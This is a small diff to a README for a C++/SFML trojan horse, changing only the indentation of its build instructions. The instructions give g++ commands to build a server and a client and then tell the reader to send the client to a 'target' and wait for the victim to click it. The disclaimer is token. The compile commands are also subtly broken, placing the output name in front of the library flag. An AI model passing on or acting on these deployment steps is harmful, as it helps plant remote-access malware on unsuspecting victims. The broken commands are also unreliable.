@@ -3,11 +3,11 @@ This is a trajos horse I developed in C++ using SFML. I will add a video transfe
 I strongly advise you to not use it for nonequal purposes
 
 If you compile with g++ use the command :
-To launch the server :
-$  g++ server.cpp -c && g++ server.o -o -lsfml-network && ./server
+    To launch the server :
+          $  g++ server.cpp -c && g++ server.o -o -lsfml-network && ./server
 
-to compile the client : 
-$  g++ client.cpp -c && g++ client.o -o -lsfml-network && ./client
+    To compile the client : 
+          $  g++ client.cpp -c && g++ client.o -o -lsfml-network && ./client
 
 Send the file obtained to your target.
 Wait for him or her to click on it  to execute it.
